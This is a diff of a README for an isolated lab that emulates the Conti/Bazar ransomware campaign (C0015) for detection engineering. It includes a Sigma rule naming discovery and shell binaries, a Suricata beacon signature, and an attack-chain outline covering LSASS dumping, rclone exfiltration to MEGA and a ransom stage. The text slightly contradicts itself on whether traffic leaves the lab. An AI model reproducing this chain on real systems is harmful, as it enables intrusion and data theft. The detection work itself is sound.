+│   │   ├── README.md            what the technique is and how the lab reproduces it
+│   │   ├── payload/             benign payload or surrogate source
+│   │   ├── tools/               launchers, wrappers, verification scripts
+│   │   ├── telemetry/           expected events and fields
+│   │   └── detection_rules/     Sigma rules for this technique
+│   ├── hta-proxy-execution/
+│   ├── regsvr32-module-execution/
+│   ├── bazar-svchost-stage/
+│   ├── winlogon-injection/
+│   ├── svchost-injection/
+│   ├── wmi-remote-process-creation/
+│   ├── lolbin-discovery/
+│   ├── share-enumeration/
+│   ├── rdp-lateral-movement/
+│   ├── anydesk-deployment/
+│   ├── processhacker-lsass-access/
+│   ├── rclone-exfiltration/
+│   └── conti-style-impact/
+└── _archive/                    earlier phase-based material, retained for reference
+```
+
+Each folder under `techniques/` covers one behaviour rather than one tool, so the folder name still
+describes the activity after a tool substitution. Inside a folder, `payload/` holds what executes,
+`tools/` holds what the operator runs around it, `telemetry/` states which events and fields the
+behaviour produces, and `detection_rules/` holds the rules for that behaviour. A folder without a
+standalone artifact keeps a short note explaining why instead of omitting the directory.
+
+## Detection opportunities
+
+| Stage | Telemetry | Rule |
 |---|---|---|
-| S6 | Target-selection orchestration EXECUTED in RUN-20261002-09: server-side decision (FS01, discovery context) recorded as `ART-06-02-RUN09` at 13:12:37Z | **resolved** (RUN-09; earlier ledger rows keep the historical NOT RUN) |
-| S12 | Type-10 interactive logons are observed in RUN-06/07/08/09; R19 positive | Session lifetime: RUN-09 verified logon-to-logoff BY TargetLogonId (T10 4624 13:17:54Z 0x4cc3dae -> 4634 13:18:36Z same LogonId, Type 10) + session Conn; 4779 (disconnect)/4778 (reconnect) not separately captured - **partially resolved**, gap documented |
-| E7 | ImageLoad enabled (BALANCED); E7 unsigned load joined to the pivot entity with ****`file.hash.sha256` present (ECS) on all four runs - equals the surrogate artifact hash (cbcd2a8b...) | **resolved** (verified 2026-10-02; hash read at `file.hash.sha256`, not `winlog.event_data.Hashes`) |
-| RUN-08 provenance | Ledger rebuilt with real Elasticsearch ids + exact UTC timestamps for every stage reference (S1 chain 09:33:20-22Z, S3 09:33:25Z, S4/S5 09:33:23Z, S7b 09:37:24Z, S8a 09:37:06Z/09:39:35Z, S8b 09:39:45Z, S9 09:39:48Z, S12 09:43:20Z, S13 09:44-45Z, S14 09:45:55Z, R23 source notes + alert ids) | **resolved** (2026-10-02) |
-| Collection and tool correlation | S10 collection reads observed as 5145 C$ (the runbook reads Finance/IT content THROUGH C$, 228 events in RUN-08); R20 documents the host-level join and the analyst hash cross-check (E11.file.hash.sha256 vs E1.process.hash) | **resolved as documented** - R16 covers the S10 reads (mechanism = C$); binary identity is a documented procedural step, not an EQL join |
-| Historical fidelity | Real Windows telemetry and bounded surrogate mechanisms are exercised | Credential provenance, original malware internals, external cloud transfer, and encryption are not reproduced |
+| Document to shell | process creation, parent image | [`office-spawns-cmd.yml`](techniques/macro-document-delivery/detection_rules/sigma/office-spawns-cmd.yml) |
+| HTA to loader | process creation, parent image | [`mshta-downloads-and-executes.yml`](techniques/hta-proxy-execution/detection_rules/sigma/mshta-downloads-and-executes.yml) |
+| Unsigned module load | image load, signature status | [`regsvr32-unsigned-module-user-path.yml`](techniques/regsvr32-module-execution/detection_rules/sigma/regsvr32-unsigned-module-user-path.yml) |
+| Service host to loader | process creation, parent image | [`svchost-spawns-rundll32.yml`](techniques/bazar-svchost-stage/detection_rules/sigma/svchost-spawns-rundll32.yml) |
+| Fallback beacon | DNS query, response status | [`dns-nxdomain-beacon-retry.yml`](techniques/bazar-svchost-stage/detection_rules/sigma/dns-nxdomain-beacon-retry.yml) |
+| Injection into a system process | remote thread creation | [`rundll32-injects-system-process.yml`](techniques/winlogon-injection/detection_rules/sigma/rundll32-injects-system-process.yml) |
+| SYSTEM context | process creation, parent image | [`winlogon-spawns-shell.yml`](techniques/winlogon-injection/detection_rules/sigma/winlogon-spawns-shell.yml) |
+| Discovery burst | process creation density | [`discovery-lolbin-burst.yml`](techniques/lolbin-discovery/detection_rules/sigma/discovery-lolbin-burst.yml) |
+| Share enumeration | command line, script block | [`powerview-sharefinder-cradle.yml`](techniques/share-enumeration/detection_rules/sigma/powerview-sharefinder-cradle.yml) |
+| WMI pivot | process creation, parent image | [`wmiprvse-spawns-rundll32.yml`](techniques/wmi-remote-process-creation/detection_rules/sigma/wmiprvse-spawns-rundll32.yml) |
+| RDP through implant | network connection, destination port | [`beacon-process-opens-rdp.yml`](techniques/rdp-lateral-movement/detection_rules/sigma/beacon-process-opens-rdp.yml) |
+| LSASS access | process access, granted access | [`lsass-access-read-mask.yml`](techniques/processhacker-lsass-access/detection_rules/sigma/lsass-access-read-mask.yml) |
+| Cloud transfer | command line, egress | [`rclone-to-cloud-storage.yml`](techniques/rclone-exfiltration/detection_rules/sigma/rclone-to-cloud-storage.yml) |
+| Impact | command line, file creation | [`locker-binary-argument-set.yml`](techniques/conti-style-impact/detection_rules/sigma/locker-binary-argument-set.yml) |
 
-S12's earlier missing-Type-10 concern and E7's earlier disabled-event concern have been resolved in the
-recorded runs. The limitations above refer to different remaining evidence requirements. Updating a
-configuration or passing the acceptance assertions does not retroactively add missing fields or records
-to an earlier run.
+The full set is indexed in [`detections/README.md`](detections/README.md), with network signatures in
+[`detections/suricata/`](detections/suricata/) and the file rule in
+[`detections/yara/`](detections/yara/).
 
-Run-specific reports and ledgers distinguish observed results from design intent. Some supporting design
-documents retain historical state descriptions; use an explicitly identified run when comparing claims.
+The cheapest reliable signal in the whole chain is the parent edge. A shell whose parent is
+`winlogon.exe` has no legitimate cause on a workstation, and the rule that matches it does not depend
+on a module hash, a directory, or a tool name:
 
-## Repository map
+```yaml
+title: winlogon Spawns a Shell or Discovery Binary
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith: '\winlogon.exe'
+    Image|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+      - '\rundll32.exe'
+      - '\net.exe'
+      - '\net1.exe'
+      - '\nltest.exe'
+      - '\whoami.exe'
+      - '\wmic.exe'
+  condition: selection
+level: critical
+```
 
-| Directory | Contents |
+The network side is covered by the profile rather than by the infrastructure, because the addresses
+change between runs and the URI pair does not:
+
+```text
+alert http $HOME_NET any -> $EXTERNAL_NET any ( \
+  msg:"C0015 Cobalt Strike jQuery profile - beacon check-in"; \
+  flow:established,to_server; \
+  http.method; content:"GET"; \
+  http.uri; content:"/jquery-3.3.1.min.js"; nocase; \
+  classtype:trojan-activity; sid:2100151; rev:1;)
+```
+
+## How to run the lab
+
+### Prerequisites
+
+| Component | Requirement |
 |---|---|
-| [phases/](phases/) | Phase narratives and investigation context |
-| [docs/](docs/) | Historical mapping, architecture, runbook, and correlation design |
-| [detections/](detections/) | Query sources, NDJSON exports, and detection catalogue |
-| [evidence/](evidence/) | Run ledgers, manifests, receipts, and verification outputs |
-| [reports/](reports/) | Run timelines, detection results, and limitations |
-| [configs/](configs/) | BALANCED and CAPTURE Sysmon profiles |
-| [payloads/](payloads/) | Macro/HTA/DLL/beacon and bounded lab surrogates |
-| [scripts/](scripts/) | C2-SIM, evidence tooling, rule generator, diagnostics, tests, and verifiers |
+| Hypervisor | VMware Workstation or equivalent, host-only network `192.168.50.0/24` |
+| Hosts | DC01, WS01, FS01 as Windows 10 or Server 2019, one Linux host |
+| C2 | Sliver server and client |
+| Telemetry | Sysmon 15.x with the profile in `infra/sysmon/`, Elastic Agent with Security and PowerShell channels |
+| Tooling | `rclone`, ProcessHacker, Mimikatz, portable AnyDesk, mingw-w64 for the service stub |
+| Cloud | one MEGA account for the exfiltration stage |
 
-Generated documents, per-run configuration, and runtime tooling belong in the gitignored `stage/`
-directory.
+### Setup
 
-## Environment and experiment boundaries
+1. Apply the Sysmon profile to WS01 and FS01 and confirm events 1, 3, 7, 8, 10, 11, and 22 arrive.
+2. Provision accounts and shares: `infra/scripts/New-LabAccounts.ps1 -BackupServer FS01`.
+3. Apply the DNS zones from `infra/dns/zone-plan.md` and remove forwarders on DC01.
+4. Issue the certificates and start the listeners per `infra/c2/README.md`; place `nginx-c0015.conf`.
+5. Build the implants, the service stub, the HTA, the delivery document, and the locker binary.
+6. Snapshot all three hosts.
 
-| Component | Recorded configuration |
+### Run order
+
+`docs/run-order.md` holds the ordered sequence with the check that confirms each step. The short form:
+delivery and proxy execution, stage hosting, injection into `winlogon.exe`, discovery, share
+enumeration, WMI pivot to the backup server, injection into the service host, RDP, two transfer rounds,
+and impact followed by a verified restore.
+
+### Expected artifacts
+
+| Artifact | Location |
 |---|---|
-| Virtualization | VMware Workstation; WS01/FS01/DC01 and auxiliary Kali |
-| Domain | `c0015.lab` / `C0015`; initial user `duc.user`, administrative lab account `it.admin` |
-| Elastic stack | Elasticsearch / Kibana / Elastic Agent 9.5.3; Fleet-managed Windows endpoints |
-| Sysmon | 15.21, schema 4.91; [BALANCED profile](configs/sysmon/sysmon-c0015-balanced.xml) |
-| Tooling | Python 3.12.x and PowerShell 7.x, as recorded in the lab notes |
-| Transfer / remote tools | rclone 1.75.1; ProcessHacker 2.39; portable AnyDesk build not pinned in the run record |
+| Delivery document and HTA | victim profile on WS01 |
+| Masqueraded module | `C:\Users\Public\compareForfor.jpg` |
+| Discovery output | `C:\ProgramData\found_shares.txt` |
+| Staged pivot beacon | `C:\ProgramData\143.dll` on FS01 |
+| LSASS dump | `C:\ProgramData\lsass.dmp` on FS01, removed after the run |
+| Ransom note | `readme.txt` in each corpus directory, removed by rollback |
+| Run record | command output, rule results, and restore verification |
 
-Administrative credentials are provisioned for the lab; the LSASS surrogate does not establish that
-credentials were extracted or acquired through the source campaign's unknown path. Runtime credentials
-are kept out of committed configuration and supplied to the verification tools through the environment.
+## Credits and references
 
-Transfer experiments terminate at the internal sink. The impact surrogate is bounded, allowlist-capped,
-reversible, and does not perform real ransomware encryption or self-propagation. Remote-access tooling
-is used for lab sessions; any observed vendor-relay traffic is not used as the simulator's C2 channel.
+- The DFIR Report, *CONTInuing the Bazar Ransomware Story*, 29 November 2021 —
+  <https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/>. The campaign
+  narrative, the process ancestry, the command lines, and the indicator set in this repository are
+  derived from that report.
+- MITRE ATT&CK campaign C0015 — <https://attack.mitre.org/campaigns/C0015/>
+- Sliver, BishopFox — <https://github.com/BishopFox/sliver>. Used as the C2 framework in place of
+  Cobalt Strike.
+- Sysmon, Microsoft Sysinternals — <https://learn.microsoft.com/sysinternals/downloads/sysmon>
+- rclone — <https://rclone.org/>
+- Process Hacker — <https://processhacker.sourceforge.io/>
+- Mimikatz, Benjamin Delpy — <https://github.com/gentilkiwi/mimikatz>
+- PowerView, PowerSploit — <https://github.com/PowerShellMafia/PowerSploit>
+- AnyDesk — <https://anydesk.com/>
+- Elastic Security — <https://www.elastic.co/security>
 
-## Sources and technical reading
+### Defensive use
 
-- [MITRE ATT&CK Campaign C0015](https://attack.mitre.org/campaigns/C0015/)
-- [The DFIR Report — CONTInuing the Bazar Ransomware Story](https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)
-- [Lab architecture](docs/architecture.md)
-- [Historical mapping and fidelity](docs/attack-chain-plan.md)
-- [Operator runbook](docs/attack-runbook.md)
-- [Correlation architecture](docs/correlation-architecture.md)
-- [Payload and C2 design](docs/payloads-and-c2.md)
+The material in this repository exists for defensive research and detection engineering. The payloads
+are benign surrogates, the C2 is a lab deployment, the corpus is synthetic, and the impact stage
+renames files without encrypting them. The infrastructure is confined to a host-only segment. The
+campaign hostnames are resolved by a local zone and never reach the internet. Nothing here is intended
+for use outside an isolated environment that the operator owns.
 
-Licensed under [MIT](LICENSE).
-
-
-
-
-
-
+Licensed under the MIT licence. See [LICENSE](LICENSE).
 
